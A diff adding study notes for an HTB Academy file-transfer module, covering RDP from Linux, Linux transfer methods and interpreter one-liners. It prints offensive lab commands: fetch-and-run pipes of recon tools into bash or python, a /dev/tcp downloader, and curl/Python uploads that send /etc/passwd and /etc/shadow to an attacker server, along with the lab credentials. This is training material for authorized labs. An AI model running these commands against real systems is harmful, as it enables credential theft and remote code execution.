@@ -542,6 +542,64 @@ Practice several upload/download methods over RDP until you’re comfortable, th
 
 ---
 
+## Appendix — RDP from Linux (optional)
+
+**What this is:** Q2 and the optional exercise want you on the Windows target over RDP. From Kali/Pwnbox the go-to client is **xfreerdp**; **Remmina** is a GUI alternative, and `rdesktop` is the older fallback.
+
+**When to use:** Any time you need the Windows desktop (run `hasher`, drive the GUI, drag files) instead of just a shell.
+
+### xfreerdp (recommended, CLI)
+
+```bash
+sudo apt update
+sudo apt install -y freerdp2-x11
+```
+
+Basic connect:
+
+```bash
+xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:TARGET_IP
+```
+
+With quality-of-life + a mounted folder for file transfer:
+
+```bash
+xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:TARGET_IP \
+  /dynamic-resolution +clipboard /cert:ignore /drive:share,/tmp/smbshare
+```
+
+| Flag | What it does |
+|------|----------------|
+| `/u` `/p` `/v` | Username, password, target IP (`/d:DOMAIN` if domain-joined) |
+| `/dynamic-resolution` | Session resizes with the window |
+| `+clipboard` | Copy/paste between Kali and Windows |
+| `/cert:ignore` | Skip the self-signed certificate prompt |
+| `/drive:share,/tmp/smbshare` | Mounts a local folder into the session as a drive — a quick file-transfer path |
+
+**QC:** Single-quote the password so shell specials like `@` and `!` aren’t interpreted.
+
+### Remmina (GUI)
+
+```bash
+sudo apt install -y remmina remmina-plugin-rdp
+remmina
+```
+
+Then: new connection → protocol **RDP** → enter IP / user / password.
+
+### Newer Kali (FreeRDP 3)
+
+The binary may be `xfreerdp3`:
+
+```bash
+sudo apt install -y freerdp3-x11
+xfreerdp3 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:TARGET_IP
+```
+
+**Bonus:** `/drive:` mounting is itself a file-transfer method — anything in the mapped folder shows up as a drive inside the RDP session, no SMB/FTP server needed.
+
+---
+
 ## Recap
 
 | Method | One-line description |
@@ -554,3 +612,537 @@ Practice several upload/download methods over RDP until you’re comfortable, th
 | WebDAV | When outbound SMB is blocked, reuse share-style `copy` over HTTP |
 
 More tools and LoLBin techniques appear in later sections of the module.
+
+---
+---
+
+# File Transfers — Linux Methods (HTB Academy)
+
+Module: **File Transfers** · Section 3 — Linux File Transfer Methods
+
+**Lab creds (SSH):** `htb-student` / `HTB_@cademy_stdnt!`
+
+**QC:** Replace IPs (`192.168.x.x` / `10.x.x.x`) and paths with your Pwnbox/target values. Authorized labs only.
+
+**Direction:** download = get a file *onto* the Linux target (from Pwnbox) · upload = send a file *off* the target (to Pwnbox).
+
+---
+
+## Why this matters
+
+Linux boxes ship with many tools that can move files, so attackers rarely need to drop a custom downloader. A real incident-response example: a threat actor exploited SQL injection, then ran a Bash script that tried **cURL first, then wget, then Python** to pull second-stage malware from a command-and-control server — all over HTTP.
+
+**Takeaway:** Linux can do FTP/SMB like Windows, but the overwhelming majority of malware uses **HTTP/HTTPS** because it blends in with normal outbound traffic. Learn the HTTP paths first, keep SSH/SCP and `/dev/tcp` as fallbacks.
+
+---
+
+## Download operations
+
+### 1. Base64 encode & decode (no network)
+
+**What this is:** Encode a file to Base64 text on one host, paste it into the other host's terminal, decode back to the original bytes. No network transfer.
+
+**When to use:** Small files (SSH keys, scripts) when you have a shell but no working HTTP/SSH channel.
+
+**Pwnbox — hash + encode**
+
+```bash
+md5sum id_rsa
+cat id_rsa | base64 -w 0; echo
+```
+
+| Command | What it does |
+|---------|----------------|
+| `md5sum id_rsa` | Fingerprint to verify the transfer later |
+| `base64 -w 0` | Encode with no line wraps (one clean line to copy) |
+| `; echo` | Print a newline after the blob for easy selection |
+
+**Linux target — decode**
+
+```bash
+echo -n '<BASE64_STRING>' | base64 -d > id_rsa
+md5sum id_rsa
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `echo -n '...'` | Emit the pasted blob without a trailing newline |
+| `base64 -d` | Decode back to the original bytes |
+| `> id_rsa` | Write the rebuilt file |
+| `md5sum` | Confirm it matches the Pwnbox hash |
+
+**Reverse (upload):** on the compromised target `cat file | base64 -w 0`, paste to Pwnbox, `base64 -d` there.
+
+---
+
+### 2. Web downloads with wget and cURL
+
+**What this is:** The two most common Linux HTTP clients. Point them at a URL and save the response.
+
+**When to use:** Default choice — outbound HTTP/HTTPS is almost always allowed.
+
+```bash
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `wget <url> -O <file>` | Download to a chosen path (uppercase `-O`) |
+| `curl -o <file> <url>` | Same idea in cURL (lowercase `-o`) |
+
+---
+
+### 3. Fileless execution with pipes
+
+**What this is:** Download and run in one step by piping the download straight into an interpreter — nothing is saved to disk.
+
+**When to use:** Run recon/exploit scripts while minimizing disk artifacts.
+
+```bash
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `curl <url> \| bash` | Pipe the script text directly into Bash |
+| `wget -qO-` | `-q` quiet, `-O-` write to stdout (so it can be piped) |
+| `\| python3` | Execute the fetched script in the interpreter |
+
+**QC:** "Fileless" isn't guaranteed — some payloads (e.g. `mkfifo`-based) still write temp files.
+
+---
+
+### 4. Download with Bash `/dev/tcp`
+
+**What this is:** When `curl`/`wget`/`python` are all missing, Bash's built-in `/dev/tcp` pseudo-device can speak raw HTTP.
+
+**When to use:** Minimal/locked-down hosts. Needs Bash ≥ 2.04 compiled with `--enable-net-redirections`.
+
+```bash
+exec 3<>/dev/tcp/10.10.10.32/80
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
+cat <&3
+```
+
+| Line | What it does |
+|------|----------------|
+| `exec 3<>/dev/tcp/IP/80` | Open a TCP socket to the web server on file descriptor 3 |
+| `echo -e "GET ... " >&3` | Send a raw HTTP GET request into the socket |
+| `cat <&3` | Read the HTTP response back (headers + body) |
+
+---
+
+### 5. SSH / SCP downloads
+
+**What this is:** `scp` copies files over SSH. Run an SSH server on Pwnbox, pull from it to the target.
+
+**When to use:** SSH (TCP/22) is reachable; you want an encrypted, authenticated transfer.
+
+**Pwnbox — enable SSH server**
+
+```bash
+sudo systemctl enable ssh
+sudo systemctl start ssh
+netstat -lnpt        # confirm 0.0.0.0:22 LISTEN
+```
+
+**Target — pull a file with SCP**
+
+```bash
+scp plaintext@192.168.49.128:/root/myroot.txt .
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `systemctl enable/start ssh` | Turn on the SSH server (persist + run now) |
+| `netstat -lnpt` | Verify sshd is listening on 22 |
+| `scp user@IP:/remote/path .` | Copy remote file to the current directory (syntax mirrors `cp`) |
+
+**QC:** Consider a throwaway user for transfers instead of your main creds/keys.
+
+---
+
+## Upload operations
+
+The download methods work in reverse for uploads too. A few upload-specific setups:
+
+### 1. HTTPS web upload (uploadserver)
+
+**What this is:** Python `uploadserver` adds an `/upload` endpoint to the built-in HTTP server; here it's run over HTTPS with a self-signed cert.
+
+**When to use:** Pull loot off the target over an encrypted channel that looks like normal web traffic.
+
+**Pwnbox — install, make cert, serve**
+
+```bash
+sudo python3 -m pip install --user uploadserver
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `pip install --user uploadserver` | Adds the upload-capable server module |
+| `openssl req -x509 ...` | Generates a self-signed cert+key (`server.pem`) |
+| `mkdir https && cd https` | Serve from a clean dir so the cert isn't exposed as a download |
+| `uploadserver 443 --server-certificate` | HTTPS upload server on port 443 |
+
+**Target — upload files**
+
+```bash
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `-X POST .../upload` | POST to the upload endpoint |
+| `-F 'files=@/path'` | Attach a file (repeat `-F` for multiple) |
+| `--insecure` | Accept the self-signed cert |
+
+---
+
+### 2. Quick web server to pull from the target
+
+**What this is:** Stand up a one-line web server *on the target* (or on Pwnbox) and fetch its files from the other side.
+
+**When to use:** Fast, dependency-light transfer using whatever runtime the box already has. Great when you can reach the server's port.
+
+```bash
+python3 -m http.server                 # serves cwd on :8000
+python2.7 -m SimpleHTTPServer           # legacy Python
+php -S 0.0.0.0:8000                     # PHP built-in server
+ruby -run -ehttpd . -p8000             # Ruby WEBrick
+```
+
+Then from the other host:
+
+```bash
+wget 192.168.49.128:8000/filetotransfer.txt
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `python3 -m http.server` | Serve the current directory over HTTP on 8000 |
+| `php -S 0.0.0.0:8000` | Same via PHP's dev server |
+| `ruby -run -ehttpd . -p8000` | Same via Ruby WEBrick |
+| `wget IP:8000/file` | Download the served file from the other host |
+
+**QC:** Inbound to a *newly opened* port may be firewalled. Serving from the target and pulling to Pwnbox (target's port reachable) often works when the reverse doesn't.
+
+---
+
+### 3. SCP upload
+
+**What this is:** Same `scp`, other direction — push a local file onto the target over SSH.
+
+**When to use:** SSH (TCP/22) to the target is allowed.
+
+```bash
+scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
+
+**Meaning:** Copy local `/etc/passwd` into the target user's home dir. Syntax mirrors `cp` — source first, `user@IP:/dest` second.
+
+---
+
+## Quick cheat sheet (Linux)
+
+| Goal | Plain-English idea | Command |
+|------|--------------------|---------|
+| Small file, no network | Paste as Base64 text | `base64 -w 0` → `base64 -d > file` |
+| HTTP download | Save a URL | `wget -O` / `curl -o` |
+| Fileless run | Download & execute in RAM | `curl URL \| bash` / `wget -qO- URL \| python3` |
+| No download tools | Raw HTTP via Bash | `exec 3<>/dev/tcp/IP/80` |
+| SSH pull | Encrypted copy from Pwnbox | `scp user@IP:/path .` |
+| HTTPS upload | POST loot to your server | `uploadserver 443` + `curl -F --insecure` |
+| Serve & pull | One-line web server | `python3 -m http.server` + `wget IP:8000/file` |
+| SSH push | Encrypted copy to target | `scp file user@IP:/dest` |
+
+---
+
+## Academy questions (Section 3)
+
+### Q1 — Python-served flag
+
+**What they want:** Download `flag.txt` from the target's web root using a **Python** web server, submit its contents.
+
+```bash
+# On target (or wherever the web root is): python3 -m http.server
+# From Pwnbox:
+wget http://TARGET:8000/flag.txt
+cat flag.txt
+```
+
+### Q2 — upload zip, SSH in, hash it
+
+**What they want:** Upload `upload_nix.zip`, SSH in, extract, run `hasher <extracted file>`, submit the hash.
+
+```text
+SSH: htb-student / HTB_@cademy_stdnt!
+```
+
+Example (serve from Pwnbox, pull on target, then SSH to run):
+
+```bash
+# Pwnbox — serve the zip
+python3 -m http.server 8000
+```
+
+```bash
+# Target (via SSH)
+ssh htb-student@TARGET
+wget http://PWNBOX:8000/upload_nix.zip
+unzip upload_nix.zip
+hasher <extracted_file>
+```
+
+Or push it directly with SCP:
+
+```bash
+scp upload_nix.zip htb-student@TARGET:/home/htb-student/
+```
+
+### Optional Exercise 1
+
+Practice upload/download methods over SSH until comfortable, then submit: `DONE`.
+
+---
+
+## Recap (Linux)
+
+| Method | One-line description |
+|--------|----------------------|
+| Base64 paste | Move small files through the terminal, no protocol needed |
+| wget / curl | Standard HTTP(S) download clients |
+| Fileless pipe | `curl/wget ... \| bash/python3` to run without touching disk |
+| `/dev/tcp` | Bash-only raw HTTP when no download tools exist |
+| SCP | Encrypted file copy over SSH, both directions |
+| uploadserver (HTTPS) | Receive uploads over TLS with a self-signed cert |
+| http.server / php / ruby | One-line web servers to serve-and-pull files |
+
+More tools and techniques appear in later sections of the module.
+
+---
+---
+
+# File Transfers — With Code (HTB Academy)
+
+Module: **File Transfers** · Section 4 — Transferring Files with Code
+
+**Lab creds (SSH):** `htb-student` / `HTB_@cademy_stdnt!` · target seen in lab: `ACADEMY-MISC-NIX04`
+
+**QC:** Replace IPs/paths with your Pwnbox/target values. Authorized labs only.
+
+---
+
+## Why this matters
+
+Targets often have an interpreter installed even when the usual transfer tools are missing. **Python, PHP, Perl, Ruby** are common on Linux (and sometimes Windows); Windows can also run **JavaScript/VBScript** via `cscript`/`mshta`. Any of these can download, upload, or execute — so a language runtime is itself a file-transfer tool. The examples below are one-liners you can paste into a shell.
+
+**Pattern:** most of these fetch over HTTP(S), mirroring the `curl → wget → python` fallback chain real malware uses.
+
+---
+
+## Download with code
+
+### Python
+
+**What this is:** Python one-liners (via `-c`) that fetch a URL to a file. Syntax differs between Python 2 and 3.
+
+**When to use:** Python is present (extremely common on Linux); `curl`/`wget` missing or filtered.
+
+```bash
+# Python 2.7
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+# Python 3
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `-c '...'` | Run the inline program |
+| `urllib.urlretrieve` (py2) / `urllib.request.urlretrieve` (py3) | Download URL → save as second arg |
+
+### PHP
+
+**What this is:** PHP one-liners (via `-r`) using three approaches — `file_get_contents`, `fopen`, or fetch-and-pipe to Bash.
+
+**When to use:** On web servers — PHP is very widely deployed, so it's often already there.
+
+```bash
+# file_get_contents + file_put_contents
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+
+# fopen streaming (buffered read/write)
+php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+# fetch and pipe straight to bash (fileless)
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `php -r '...'` | Run inline PHP |
+| `file_get_contents` / `file_put_contents` | Read URL into memory, write to file |
+| `fopen("...","rb")` + `fread`/`fwrite` | Stream remote → local in 1 KB chunks |
+| `@file(URL)` + `\| bash` | Read URL as lines, echo, pipe to shell (no file saved) |
+
+**Note:** `@file(URL)` works only if PHP `fopen` URL wrappers are enabled.
+
+### Ruby & Perl
+
+**What this is:** One-liners via `-e`.
+
+**When to use:** Ruby/Perl present but Python/PHP aren't.
+
+```bash
+# Ruby
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+
+# Perl
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `ruby -e` / `perl -e` | Run inline program |
+| `Net::HTTP.get` + `File.write` | Ruby: fetch URL, write file |
+| `LWP::Simple getstore` | Perl: fetch URL → save file |
+
+### JavaScript (Windows, cscript)
+
+**What this is:** A `wget.js` script using `WinHttpRequest` + `ADODB.Stream`, run with `cscript.exe`.
+
+**When to use:** Windows target without PowerShell web access; living off `cscript`.
+
+```javascript
+// wget.js
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+
+```cmd
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `WinHttpRequest` | Performs the HTTP GET (arg 0 = URL) |
+| `ADODB.Stream` (Type 1 = binary) | Buffers response bytes and saves to arg 1 |
+| `cscript /nologo wget.js URL OUT` | Runs the script: download URL → OUT file |
+
+### VBScript (Windows, cscript)
+
+**What this is:** Same idea as the JS version using `MSXML2.XMLHTTP` + `ADODB.Stream`. VBScript ships on every Windows desktop since 98.
+
+```vbscript
+' wget.vbs
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+
+```cmd
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `Microsoft.XMLHTTP` | HTTP GET (arg 0 = URL) |
+| `ADODB.Stream .savetofile ...,2` | Save bytes to arg 1 (`2` = overwrite) |
+
+---
+
+## Upload with code (Python3)
+
+**What this is:** Python's `requests` module POSTs a file to the Python `uploadserver` `/upload` endpoint.
+
+**When to use:** Pull loot off a box that has Python 3 + `requests`.
+
+**Pwnbox — start upload server**
+
+```bash
+python3 -m uploadserver
+# File upload available at /upload — serves on :8000
+```
+
+**Target — upload one-liner**
+
+```bash
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+Expanded so each piece is clear:
+
+```python
+import requests                                  # HTTP client module
+URL = "http://192.168.49.128:8000/upload"        # upload endpoint
+file = open("/etc/passwd", "rb")                 # open the file (binary)
+r = requests.post(URL, files={"files": file})    # POST it as multipart upload
+```
+
+| Piece | What it does |
+|-------|----------------|
+| `requests.post(url, files=...)` | Sends a multipart POST (a file upload) |
+| `open(path, "rb")` | Reads the file as binary to attach |
+| `uploadserver` | Receives it at `/upload` and writes to disk |
+
+---
+
+## Quick cheat sheet (code)
+
+| Language | Download one-liner | Notes |
+|----------|--------------------|-------|
+| Python 3 | `python3 -c 'import urllib.request;urllib.request.urlretrieve(URL,OUT)'` | py2 uses `urllib.urlretrieve` |
+| PHP | `php -r 'file_put_contents(OUT,file_get_contents(URL));'` | `... \| bash` for fileless |
+| Ruby | `ruby -e 'require"net/http";File.write(OUT,Net::HTTP.get(URI(URL)))'` | |
+| Perl | `perl -e 'use LWP::Simple;getstore(URL,OUT);'` | |
+| JScript | `cscript /nologo wget.js URL OUT` | Windows LoLBin |
+| VBScript | `cscript /nologo wget.vbs URL OUT` | Windows LoLBin |
+| Python 3 (upload) | `python3 -c 'import requests;requests.post(URL,files={"files":open(F,"rb")})'` | to `uploadserver` |
+
+---
+
+## Academy (Section 4)
+
+### Optional Exercise 1
+
+SSH in (`htb-student` / `HTB_@cademy_stdnt!`) and practice these code-based upload/download one-liners with your attack host, then submit: `DONE`.
+
+```bash
+ssh htb-student@TARGET
+# then try, e.g.:
+python3 -c 'import urllib.request;urllib.request.urlretrieve("http://PWNBOX:8000/flag.txt","flag.txt")'
+```
+
+---
+
+## Recap (code)
+
+| Method | One-line description |
+|--------|----------------------|
+| Python `-c` | `urlretrieve` download; `requests.post` upload |
+| PHP `-r` | `file_get_contents`/`fopen` download, or pipe to `bash` |
+| Ruby/Perl `-e` | `Net::HTTP`/`LWP::Simple` downloads |
+| JScript/VBScript + `cscript` | Windows LoLBin downloaders via `WinHttp`/`XMLHTTP` + `ADODB.Stream` |
+| Python `requests` | Code-driven multipart upload to `uploadserver` |
+
+Interpreters double as file-transfer tools — handy when the usual utilities are stripped.
